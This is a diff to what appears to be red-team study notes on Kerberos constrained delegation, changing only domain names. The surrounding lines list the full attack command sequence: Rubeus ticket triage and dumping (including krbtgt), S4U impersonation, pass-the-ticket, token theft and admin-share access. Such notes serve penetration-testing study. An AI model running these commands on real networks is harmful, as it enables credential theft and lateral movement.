@@ -35,11 +35,11 @@ constrained delegation takes it a step further by allowing you to configure whic
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
 execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:JOHN-PC$ /msdsspn:cifs/John-PC.acmebank.local /ticket:
-execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.insomnia.co.mm /ticket:[...snip...]
 execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip...]
 steal_token 3420
-ls \\fs-1.cyberbotic.io\c$
+ls \\fs-1.insomnia.co.mm\c$
 ```
 ### Resource-based Constrained Delegation
 service administrators/owners can configure which domain accounts are allowed to delegate to them.
